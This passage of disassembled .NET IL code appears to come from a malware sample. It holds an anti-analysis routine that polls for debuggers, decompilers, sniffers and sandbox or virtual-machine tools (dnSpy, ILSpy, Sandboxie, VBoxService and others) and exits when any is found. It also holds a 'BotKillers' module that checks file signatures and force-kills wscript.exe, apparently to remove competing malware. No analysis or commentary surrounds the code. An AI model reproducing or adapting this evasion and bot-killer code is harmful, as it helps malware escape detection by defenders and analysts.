    IL_0095:  conv.i4
    IL_0096:  blt.s      IL_007f

    IL_0098:  ldstr      "apateDNS"
    IL_009d:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00a2:  stloc.s    V_8
    IL_00a4:  ldc.i4.0
    IL_00a5:  stloc.s    V_9
    IL_00a7:  br.s       IL_00ba

    IL_00a9:  ldloc.s    V_8
    IL_00ab:  ldloc.s    V_9
    IL_00ad:  ldelem.ref
    IL_00ae:  pop
    IL_00af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00b4:  ldloc.s    V_9
    IL_00b6:  ldc.i4.1
    IL_00b7:  add.ovf
    IL_00b8:  stloc.s    V_9
    IL_00ba:  ldloc.s    V_9
    IL_00bc:  ldloc.s    V_8
    IL_00be:  ldlen
    IL_00bf:  conv.i4
    IL_00c0:  blt.s      IL_00a9

    IL_00c2:  ldstr      "IPBlocker"
    IL_00c7:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00cc:  stloc.s    V_10
    IL_00ce:  ldc.i4.0
    IL_00cf:  stloc.s    V_11
    IL_00d1:  br.s       IL_00e4

    IL_00d3:  ldloc.s    V_10
    IL_00d5:  ldloc.s    V_11
    IL_00d7:  ldelem.ref
    IL_00d8:  pop
    IL_00d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00de:  ldloc.s    V_11
    IL_00e0:  ldc.i4.1
    IL_00e1:  add.ovf
    IL_00e2:  stloc.s    V_11
    IL_00e4:  ldloc.s    V_11
    IL_00e6:  ldloc.s    V_10
    IL_00e8:  ldlen
    IL_00e9:  conv.i4
    IL_00ea:  blt.s      IL_00d3

    IL_00ec:  ldstr      "TiGeR-Firewall"
    IL_00f1:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00f6:  stloc.s    V_12
    IL_00f8:  ldc.i4.0
    IL_00f9:  stloc.s    V_13
    IL_00fb:  br.s       IL_010e

    IL_00fd:  ldloc.s    V_12
    IL_00ff:  ldloc.s    V_13
    IL_0101:  ldelem.ref
    IL_0102:  pop
    IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0108:  ldloc.s    V_13
    IL_010a:  ldc.i4.1
    IL_010b:  add.ovf
    IL_010c:  stloc.s    V_13
    IL_010e:  ldloc.s    V_13
    IL_0110:  ldloc.s    V_12
    IL_0112:  ldlen
    IL_0113:  conv.i4
    IL_0114:  blt.s      IL_00fd

    IL_0116:  ldstr      "smsniff"
    IL_011b:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0120:  stloc.s    V_14
    IL_0122:  ldc.i4.0
    IL_0123:  stloc.s    V_15
    IL_0125:  br.s       IL_0138

    IL_0127:  ldloc.s    V_14
    IL_0129:  ldloc.s    V_15
    IL_012b:  ldelem.ref
    IL_012c:  pop
    IL_012d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0132:  ldloc.s    V_15
    IL_0134:  ldc.i4.1
    IL_0135:  add.ovf
    IL_0136:  stloc.s    V_15
    IL_0138:  ldloc.s    V_15
    IL_013a:  ldloc.s    V_14
    IL_013c:  ldlen
    IL_013d:  conv.i4
    IL_013e:  blt.s      IL_0127

    IL_0140:  ldstr      "exeinfoPE"
    IL_0145:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_014a:  stloc.s    V_16
    IL_014c:  ldc.i4.0
    IL_014d:  stloc.s    V_17
    IL_014f:  br.s       IL_0162

    IL_0151:  ldloc.s    V_16
    IL_0153:  ldloc.s    V_17
    IL_0155:  ldelem.ref
    IL_0156:  pop
    IL_0157:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_015c:  ldloc.s    V_17
    IL_015e:  ldc.i4.1
    IL_015f:  add.ovf
    IL_0160:  stloc.s    V_17
    IL_0162:  ldloc.s    V_17
    IL_0164:  ldloc.s    V_16
    IL_0166:  ldlen
    IL_0167:  conv.i4
    IL_0168:  blt.s      IL_0151

    IL_016a:  ldstr      "NetSnifferCs"
    IL_016f:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0174:  stloc.s    V_18
    IL_0176:  ldc.i4.0
    IL_0177:  stloc.s    V_19
    IL_0179:  br.s       IL_018c

    IL_017b:  ldloc.s    V_18
    IL_017d:  ldloc.s    V_19
    IL_017f:  ldelem.ref
    IL_0180:  pop
    IL_0181:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0186:  ldloc.s    V_19
    IL_0188:  ldc.i4.1
    IL_0189:  add.ovf
    IL_018a:  stloc.s    V_19
    IL_018c:  ldloc.s    V_19
    IL_018e:  ldloc.s    V_18
    IL_0190:  ldlen
    IL_0191:  conv.i4
    IL_0192:  blt.s      IL_017b

    IL_0194:  ldstr      "Sandboxie Control"
    IL_0199:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_019e:  stloc.s    V_20
    IL_01a0:  ldc.i4.0
    IL_01a1:  stloc.s    V_21
    IL_01a3:  br.s       IL_01b6

    IL_01a5:  ldloc.s    V_20
    IL_01a7:  ldloc.s    V_21
    IL_01a9:  ldelem.ref
    IL_01aa:  pop
    IL_01ab:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01b0:  ldloc.s    V_21
    IL_01b2:  ldc.i4.1
    IL_01b3:  add.ovf
    IL_01b4:  stloc.s    V_21
    IL_01b6:  ldloc.s    V_21
    IL_01b8:  ldloc.s    V_20
    IL_01ba:  ldlen
    IL_01bb:  conv.i4
    IL_01bc:  blt.s      IL_01a5

    IL_01be:  ldstr      "processhacker"
    IL_01c3:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01c8:  stloc.s    V_22
    IL_01ca:  ldc.i4.0
    IL_01cb:  stloc.s    V_23
    IL_01cd:  br.s       IL_01e0

    IL_01cf:  ldloc.s    V_22
    IL_01d1:  ldloc.s    V_23
    IL_01d3:  ldelem.ref
    IL_01d4:  pop
    IL_01d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01da:  ldloc.s    V_23
    IL_01dc:  ldc.i4.1
    IL_01dd:  add.ovf
    IL_01de:  stloc.s    V_23
    IL_01e0:  ldloc.s    V_23
    IL_01e2:  ldloc.s    V_22
    IL_01e4:  ldlen
    IL_01e5:  conv.i4
    IL_01e6:  blt.s      IL_01cf

    IL_01e8:  ldstr      "dnSpy"
    IL_01ed:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01f2:  stloc.s    V_24
    IL_01f4:  ldc.i4.0
    IL_01f5:  stloc.s    V_25
    IL_01f7:  br.s       IL_020a

    IL_01f9:  ldloc.s    V_24
    IL_01fb:  ldloc.s    V_25
    IL_01fd:  ldelem.ref
    IL_01fe:  pop
    IL_01ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0204:  ldloc.s    V_25
    IL_0206:  ldc.i4.1
    IL_0207:  add.ovf
    IL_0208:  stloc.s    V_25
    IL_020a:  ldloc.s    V_25
    IL_020c:  ldloc.s    V_24
    IL_020e:  ldlen
    IL_020f:  conv.i4
    IL_0210:  blt.s      IL_01f9

    IL_0212:  ldstr      "CodeReflect"
    IL_0217:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_021c:  stloc.s    V_26
    IL_021e:  ldc.i4.0
    IL_021f:  stloc.s    V_27
    IL_0221:  br.s       IL_0234

    IL_0223:  ldloc.s    V_26
    IL_0225:  ldloc.s    V_27
    IL_0227:  ldelem.ref
    IL_0228:  pop
    IL_0229:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_022e:  ldloc.s    V_27
    IL_0230:  ldc.i4.1
    IL_0231:  add.ovf
    IL_0232:  stloc.s    V_27
    IL_0234:  ldloc.s    V_27
    IL_0236:  ldloc.s    V_26
    IL_0238:  ldlen
    IL_0239:  conv.i4
    IL_023a:  blt.s      IL_0223

    IL_023c:  ldstr      "Reflector"
    IL_0241:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0246:  stloc.s    V_28
    IL_0248:  ldc.i4.0
    IL_0249:  stloc.s    V_29
    IL_024b:  br.s       IL_025e

    IL_024d:  ldloc.s    V_28
    IL_024f:  ldloc.s    V_29
    IL_0251:  ldelem.ref
    IL_0252:  pop
    IL_0253:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0258:  ldloc.s    V_29
    IL_025a:  ldc.i4.1
    IL_025b:  add.ovf
    IL_025c:  stloc.s    V_29
    IL_025e:  ldloc.s    V_29
    IL_0260:  ldloc.s    V_28
    IL_0262:  ldlen
    IL_0263:  conv.i4
    IL_0264:  blt.s      IL_024d

    IL_0266:  ldstr      "ILSpy"
    IL_026b:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0270:  stloc.s    V_30
    IL_0272:  ldc.i4.0
    IL_0273:  stloc.s    V_31
    IL_0275:  br.s       IL_0288

    IL_0277:  ldloc.s    V_30
    IL_0279:  ldloc.s    V_31
    IL_027b:  ldelem.ref
    IL_027c:  pop
    IL_027d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0282:  ldloc.s    V_31
    IL_0284:  ldc.i4.1
    IL_0285:  add.ovf
    IL_0286:  stloc.s    V_31
    IL_0288:  ldloc.s    V_31
    IL_028a:  ldloc.s    V_30
    IL_028c:  ldlen
    IL_028d:  conv.i4
    IL_028e:  blt.s      IL_0277

    IL_0290:  ldstr      "VGAuthService"
    IL_0295:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_029a:  stloc.s    V_32
    IL_029c:  ldc.i4.0
    IL_029d:  stloc.s    V_33
    IL_029f:  br.s       IL_02b2

    IL_02a1:  ldloc.s    V_32
    IL_02a3:  ldloc.s    V_33
    IL_02a5:  ldelem.ref
    IL_02a6:  pop
    IL_02a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02ac:  ldloc.s    V_33
    IL_02ae:  ldc.i4.1
    IL_02af:  add.ovf
    IL_02b0:  stloc.s    V_33
    IL_02b2:  ldloc.s    V_33
    IL_02b4:  ldloc.s    V_32
    IL_02b6:  ldlen
    IL_02b7:  conv.i4
    IL_02b8:  blt.s      IL_02a1

    IL_02ba:  ldstr      "VBoxService"
    IL_02bf:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_02c4:  stloc.s    V_34
    IL_02c6:  ldc.i4.0
    IL_02c7:  stloc.s    V_35
    IL_02c9:  br.s       IL_02dc

    IL_02cb:  ldloc.s    V_34
    IL_02cd:  ldloc.s    V_35
    IL_02cf:  ldelem.ref
    IL_02d0:  pop
    IL_02d1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02d6:  ldloc.s    V_35
    IL_02d8:  ldc.i4.1
    IL_02d9:  add.ovf
    IL_02da:  stloc.s    V_35
    IL_02dc:  ldloc.s    V_35
    IL_02de:  ldloc.s    V_34
    IL_02e0:  ldlen
    IL_02e1:  conv.i4
    IL_02e2:  blt.s      IL_02cb

    IL_02e4:  ret
  } // end of method MyAntiProcess::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     5.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer MyAntiProcess::Timer
    IL_0013:  ldsfld     class [System]System.Timers.Timer MyAntiProcess::Timer
    IL_0018:  ldnull
    IL_0019:  ldftn      void MyAntiProcess::Handler(object,
                                                     class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer MyAntiProcess::Timer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method MyAntiProcess::Start

} // end of class MyAntiProcess

.class private auto ansi sealed beforefieldinit BotKillers
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested public ThreadAccess
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype BotKillers/ThreadAccess DIRECT_IMPERSONATION = int32(0x00000200)
    .field public static literal valuetype BotKillers/ThreadAccess GET_CONTEXT = int32(0x00000008)
    .field public static literal valuetype BotKillers/ThreadAccess IMPERSONATE = int32(0x00000100)
    .field public static literal valuetype BotKillers/ThreadAccess QUERY_INFORMATION = int32(0x00000040)
    .field public static literal valuetype BotKillers/ThreadAccess SET_CONTEXT = int32(0x00000010)
    .field public static literal valuetype BotKillers/ThreadAccess SET_INFORMATION = int32(0x00000020)
    .field public static literal valuetype BotKillers/ThreadAccess SET_THREAD_TOKEN = int32(0x00000080)
    .field public static literal valuetype BotKillers/ThreadAccess SUSPEND_RESUME = int32(0x00000002)
    .field public static literal valuetype BotKillers/ThreadAccess TERMINATE = int32(0x00000001)
  } // end of class ThreadAccess

  .class auto ansi sealed nested public WinTrustDataUIChoice
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice All = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice None = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice NoBad = uint32(0x00000003)
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice NoGood = uint32(0x00000004)
  } // end of class WinTrustDataUIChoice

  .class auto ansi sealed nested public WinTrustDataRevocationChecks
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataRevocationChecks None = uint32(0x00000000)
    .field public static literal valuetype BotKillers/WinTrustDataRevocationChecks WholeChain = uint32(0x00000001)
  } // end of class WinTrustDataRevocationChecks

  .class auto ansi sealed nested public WinTrustDataChoice
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataChoice File = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Catalog = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Blob = uint32(0x00000003)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Signer = uint32(0x00000004)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Certificate = uint32(0x00000005)
  } // end of class WinTrustDataChoice

  .class auto ansi sealed nested public WinTrustDataStateAction
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataStateAction Ignore = uint32(0x00000000)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction Verify = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction Close = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction AutoCache = uint32(0x00000003)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction AutoCacheFlush = uint32(0x00000004)
  } // end of class WinTrustDataStateAction

  .class auto ansi sealed nested public WinTrustDataProvFlags
         extends [mscorlib]System.Enum
  {
    .custom instance void [mscorlib]System.FlagsAttribute::.ctor() = ( 01 00 00 00 ) 
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags UseIe4TrustFlag = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags NoIe4ChainFlag = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags NoPolicyUsageFlag = uint32(0x00000004)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckNone = uint32(0x00000010)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckEndCert = uint32(0x00000020)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckChain = uint32(0x00000040)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckChainExcludeRoot = uint32(0x00000080)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags SaferFlag = uint32(0x00000100)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags HashOnlyFlag = uint32(0x00000200)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags UseDefaultOsverCheck = uint32(0x00000400)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags LifetimeSigningFlag = uint32(0x00000800)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags CacheOnlyUrlRetrieval = uint32(0x00001000)
  } // end of class WinTrustDataProvFlags

  .class auto ansi sealed nested public WinTrustDataUIContext
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataUIContext Execute = uint32(0x00000000)
    .field public static literal valuetype BotKillers/WinTrustDataUIContext Install = uint32(0x00000001)
  } // end of class WinTrustDataUIContext

  .class sequential unicode nested public WinTrustFileInfo
         extends [mscorlib]System.Object
  {
    .field private int32 StructSize
    .field private native int pszFilePath
    .field private native int hFile
    .field private native int pgKnownSubject
    .method public specialname rtspecialname 
            instance void  .ctor(string _filePath) cil managed
    {
      // Code size       62 (0x3e)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ldarg.0
      IL_0007:  ldtoken    BotKillers/WinTrustFileInfo
      IL_000c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0011:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
      IL_0016:  stfld      int32 BotKillers/WinTrustFileInfo::StructSize
      IL_001b:  ldarg.0
      IL_001c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0021:  stfld      native int BotKillers/WinTrustFileInfo::hFile
      IL_0026:  ldarg.0
      IL_0027:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_002c:  stfld      native int BotKillers/WinTrustFileInfo::pgKnownSubject
      IL_0031:  ldarg.0
      IL_0032:  ldarg.1
      IL_0033:  call       native int [mscorlib]System.Runtime.InteropServices.Marshal::StringToCoTaskMemAuto(string)
      IL_0038:  stfld      native int BotKillers/WinTrustFileInfo::pszFilePath
      IL_003d:  ret
    } // end of method WinTrustFileInfo::.ctor

    .method family hidebysig strict virtual 
            instance void  Finalize() cil managed
    {
      // Code size       21 (0x15)
      .maxstack  1
      .try
      {
        IL_0000:  ldarg.0
        IL_0001:  ldfld      native int BotKillers/WinTrustFileInfo::pszFilePath
        IL_0006:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::FreeCoTaskMem(native int)
        IL_000b:  leave.s    IL_0014

      }  // end .try
      finally
      {
        IL_000d:  ldarg.0
        IL_000e:  call       instance void [mscorlib]System.Object::Finalize()
        IL_0013:  endfinally
      }  // end handler
      IL_0014:  ret
    } // end of method WinTrustFileInfo::Finalize

  } // end of class WinTrustFileInfo

  .class sequential unicode nested public WinTrustData
         extends [mscorlib]System.Object
  {
    .field private int32 StructSize
    .field private native int PolicyCallbackData
    .field private native int SIPClientData
    .field private valuetype BotKillers/WinTrustDataUIChoice UIChoice
    .field private valuetype BotKillers/WinTrustDataRevocationChecks RevocationChecks
    .field private valuetype BotKillers/WinTrustDataChoice UnionChoice
    .field private native int FileInfoPtr
    .field private valuetype BotKillers/WinTrustDataStateAction StateAction
    .field private native int StateData
    .field private string URLReference
    .field private valuetype BotKillers/WinTrustDataProvFlags ProvFlags
    .field private valuetype BotKillers/WinTrustDataUIContext UIContext
    .method public specialname rtspecialname 
            instance void  .ctor(string _fileName) cil managed
    {
      // Code size       158 (0x9e)
      .maxstack  3
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ldarg.0
      IL_0007:  ldtoken    BotKillers/WinTrustData
      IL_000c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0011:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
      IL_0016:  stfld      int32 BotKillers/WinTrustData::StructSize
      IL_001b:  ldarg.0
      IL_001c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0021:  stfld      native int BotKillers/WinTrustData::PolicyCallbackData
      IL_0026:  ldarg.0
      IL_0027:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_002c:  stfld      native int BotKillers/WinTrustData::SIPClientData
      IL_0031:  ldarg.0
      IL_0032:  ldc.i4.2
      IL_0033:  stfld      valuetype BotKillers/WinTrustDataUIChoice BotKillers/WinTrustData::UIChoice
      IL_0038:  ldarg.0
      IL_0039:  ldc.i4.0
      IL_003a:  stfld      valuetype BotKillers/WinTrustDataRevocationChecks BotKillers/WinTrustData::RevocationChecks
      IL_003f:  ldarg.0
      IL_0040:  ldc.i4.1
      IL_0041:  stfld      valuetype BotKillers/WinTrustDataChoice BotKillers/WinTrustData::UnionChoice
      IL_0046:  ldarg.0
      IL_0047:  ldc.i4.0
      IL_0048:  stfld      valuetype BotKillers/WinTrustDataStateAction BotKillers/WinTrustData::StateAction
      IL_004d:  ldarg.0
      IL_004e:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0053:  stfld      native int BotKillers/WinTrustData::StateData
      IL_0058:  ldarg.0
      IL_0059:  ldnull
      IL_005a:  stfld      string BotKillers/WinTrustData::URLReference
      IL_005f:  ldarg.0
      IL_0060:  ldc.i4     0x100
      IL_0065:  stfld      valuetype BotKillers/WinTrustDataProvFlags BotKillers/WinTrustData::ProvFlags
      IL_006a:  ldarg.0
      IL_006b:  ldc.i4.0
      IL_006c:  stfld      valuetype BotKillers/WinTrustDataUIContext BotKillers/WinTrustData::UIContext
      IL_0071:  ldarg.1
      IL_0072:  newobj     instance void BotKillers/WinTrustFileInfo::.ctor(string)
      IL_0077:  ldarg.0
      IL_0078:  ldtoken    BotKillers/WinTrustFileInfo
      IL_007d:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0082:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
      IL_0087:  call       native int [mscorlib]System.Runtime.InteropServices.Marshal::AllocCoTaskMem(int32)
      IL_008c:  stfld      native int BotKillers/WinTrustData::FileInfoPtr
      IL_0091:  ldarg.0
      IL_0092:  ldfld      native int BotKillers/WinTrustData::FileInfoPtr
      IL_0097:  ldc.i4.0
      IL_0098:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::StructureToPtr(object,
                                                                                                 native int,
                                                                                                 bool)
      IL_009d:  ret
    } // end of method WinTrustData::.ctor

    .method family hidebysig strict virtual 
            instance void  Finalize() cil managed
    {
      // Code size       21 (0x15)
      .maxstack  1
      .try
      {
        IL_0000:  ldarg.0
        IL_0001:  ldfld      native int BotKillers/WinTrustData::FileInfoPtr
        IL_0006:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::FreeCoTaskMem(native int)
        IL_000b:  leave.s    IL_0014

      }  // end .try
      finally
      {
        IL_000d:  ldarg.0
        IL_000e:  call       instance void [mscorlib]System.Object::Finalize()
        IL_0013:  endfinally
      }  // end handler
      IL_0014:  ret
    } // end of method WinTrustData::Finalize

  } // end of class WinTrustData

  .class auto ansi sealed nested public WinVerifyTrustResult
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype BotKillers/WinVerifyTrustResult Success = int32(0x00000000)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult ProviderUnknown = int32(0x800B0001)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult ActionUnknown = int32(0x800B0002)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult SubjectFormUnknown = int32(0x800B0003)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult SubjectNotTrusted = int32(0x800B0004)
  } // end of class WinVerifyTrustResult

  .class auto ansi sealed nested public beforefieldinit WinTrust
         extends [mscorlib]System.Object
  {
    .field private static initonly native int INVALID_HANDLE_VALUE
    .field private static literal string WINTRUST_ACTION_GENERIC_VERIFY_V2 = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}"
    .method private specialname rtspecialname static 
            void  .cctor() cil managed
    {
      // Code size       12 (0xc)
      .maxstack  8
      IL_0000:  ldc.i4.m1
      IL_0001:  newobj     instance void [mscorlib]System.IntPtr::.ctor(int32)
      IL_0006:  stsfld     native int BotKillers/WinTrust::INVALID_HANDLE_VALUE
      IL_000b:  ret
    } // end of method WinTrust::.cctor

    .method private static pinvokeimpl("wintrust.dll" nomangle unicode winapi) 
            valuetype BotKillers/WinVerifyTrustResult 
            WinVerifyTrust([in] native int hwnd,
                           [in] valuetype [mscorlib]System.Guid  marshal( lpstruct) pgActionID,
                           [in] class BotKillers/WinTrustData pWVTData) cil managed preservesig
    {
    }
    .method public static bool  VerifyEmbeddedSignature(string fileName) cil managed
    {
      // Code size       52 (0x34)
      .maxstack  3
      .locals init (bool V_0,
               class BotKillers/WinTrustData V_1,
               valuetype [mscorlib]System.Guid V_2)
      .try
      {
        IL_0000:  ldarg.0
        IL_0001:  newobj     instance void BotKillers/WinTrustData::.ctor(string)
        IL_0006:  stloc.1
        IL_0007:  ldstr      "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}"
        IL_000c:  newobj     instance void [mscorlib]System.Guid::.ctor(string)
        IL_0011:  stloc.2
        IL_0012:  ldsfld     native int BotKillers/WinTrust::INVALID_HANDLE_VALUE
        IL_0017:  ldloc.2
        IL_0018:  ldloc.1
        IL_0019:  call       valuetype BotKillers/WinVerifyTrustResult BotKillers/WinTrust::WinVerifyTrust(native int,
                                                                                                           valuetype [mscorlib]System.Guid,
                                                                                                           class BotKillers/WinTrustData)
        IL_001e:  ldc.i4.0
        IL_001f:  ceq
        IL_0021:  stloc.0
        IL_0022:  leave.s    IL_0032

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0024:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0029:  ldc.i4.0
        IL_002a:  stloc.0
        IL_002b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0030:  leave.s    IL_0032

      }  // end handler
      IL_0032:  ldloc.0
      IL_0033:  ret
    } // end of method WinTrust::VerifyEmbeddedSignature

    .method private specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method WinTrust::.ctor

  } // end of class WinTrust

  .field private static int32 ProccessKilled
  .field private static int32 Startupkilled
  .field private static string hio
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  stsfld     int32 BotKillers::ProccessKilled
    IL_0006:  ldc.i4.0
    IL_0007:  stsfld     int32 BotKillers::Startupkilled
    IL_000c:  ret
  } // end of method BotKillers::.cctor

  .method private static pinvokeimpl("user32.dll" lasterr winapi) 
          bool  marshal( bool)  IsWindowVisible(native int hWnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method public static void  RunStandardBotKiller() cil managed
  {
    // Code size       189 (0xbd)
    .maxstack  4
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.2
      IL_0009:  ldstr      "TASKKILL /F /IM wscript.exe"
      IL_000e:  ldc.i4.0
      IL_000f:  ldc.i4.0
      IL_0010:  ldc.i4.m1
      IL_0011:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0016:  pop
      IL_0017:  ldc.i4.3
      IL_0018:  stloc.2
